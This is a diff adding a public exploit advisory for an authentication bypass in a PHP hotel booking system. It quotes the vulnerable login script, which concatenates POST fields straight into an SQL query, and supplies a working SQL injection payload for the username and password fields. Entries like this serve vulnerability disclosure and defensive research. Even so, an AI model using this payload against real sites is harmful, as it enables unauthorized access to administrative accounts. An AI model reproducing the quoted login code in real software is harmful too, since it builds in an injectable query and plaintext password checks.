@@ -1,0 +1,36 @@
+# Exploit Title: Web Based Online Hotel Booking System 0.1.0 - Authentication Bypass
+# Date: 2020-07-03
+# Exploit Author: KeopssGroup0day,Inc
+# Vendor Homepage: https://github.com/mrzulkarnine/Web-based-hotel-booking-system
+# Software Link: https://github.com/mrzulkarnine/Web-based-hotel-
+booking-system
+# Version: 0.1.0
+# Tested on: Kali Linux
+
+Source code(localhost/admin/loginauth.php):
+                   <?php
+                        session_start();
+
+                         $_SESSION['username'] = $_POST['username'];
+                         $_SESSION['password'] =  $_POST['password'];
+
+                         include './auth.php';
+                         $re = mysql_query("select * from user where
+username = '".$_SESSION['username']."'  AND password =
+'".$_SESSION['password']."' " );
+echo mysql_error();
+                        if(mysql_num_rows($re) > 0)
+                          {
+                            header('Refresh: 0;url=dashboard.php');
+                           }
+                       else
+                          {
+
+                             session_destroy();
+                             header("location: index.htm");
+                           }
+                           ?>
+
+Payload:
+       Username: 1' or 1 = 1 LIMIT 1#
+       Password: 1' or 1 = 1 LIMIT 1#
